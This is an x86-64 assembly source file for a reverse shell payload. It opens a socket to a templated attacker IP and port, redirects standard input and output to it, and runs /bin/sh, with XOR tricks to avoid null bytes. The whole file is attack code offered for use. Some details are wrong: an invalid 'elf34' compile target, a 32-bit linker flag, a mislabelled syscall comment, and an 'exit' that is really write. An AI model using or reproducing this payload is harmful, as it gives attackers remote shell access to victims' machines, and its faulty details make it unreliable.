; compile : nasm -f elf34 reverser_64_optimized.asm && ld -m elf_i386 reverser_64_optimized.o -o reverseshell
global      _start

section .text

    IP_ADDRESS  equ     -ip_address-    ; 0xfeffff80
    PORT        equ     -port-          ; 0x901F
    AF_INET     equ     0x2
    SOCK_STREAM equ     0x1


    SOCKET      equ     0x29
    CONNECT     equ     0x2a
    DUP         equ     0x21
    EXECVE      equ     0x3b
    EXIT        equ     0x1


_start:
; We first need to create a socket
; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
    mov         al, 0x29        ; socketcall (102)
    push        0x2
    pop         rdi
    push        0x1
    pop         rsi
    xor         edx, edx
    syscall                     ; execute
    mov         r9, rax

; Then connect to ip and port
    xchg        rdi, rax
    xor         rcx, rcx
    mov         ebx, -ip_address- ; ip_address = 127.0.0.1 = 7F000001: need to put it in reverse : 0100007f xored with ffffffff : feffff80
    xor         ebx, 0xffffffff ; xoring ip address twice to avoid storing nullbyte
    push        rcx
    push        rcx
    push        rbx
    pushw       -port-       ; port = 8080 = 1F90; need to put it in reverse
    pushw       0x2    ; AF_INET (2)
    mov         rsi, rsp
    pushw       0x10
    pop         rdx

    mov         rbx, rdi
    mov         al, 0x2a
    syscall             ; execute

; Get input and redirect output
    pushw       0x02
    pop         rsi
    mov         rdi, r9

loop:
    push        0x21
    pop         rax
    syscall
    dec         rsi
    jns         loop

; Execute a shell
    xor         rdx, rdx
    push        rdx
    push        rdx
    mov         rbx, 0x68732f6e69622f2f
    push        rbx
    mov         rdi, rsp
    push        rdx
    push        rdi
    mov         rsi, rsp
    
    mov         al, 0x3b
    syscall

    xor         rbx, rbx
    xor         rax, rax
    mov         al, 0x1
    syscall
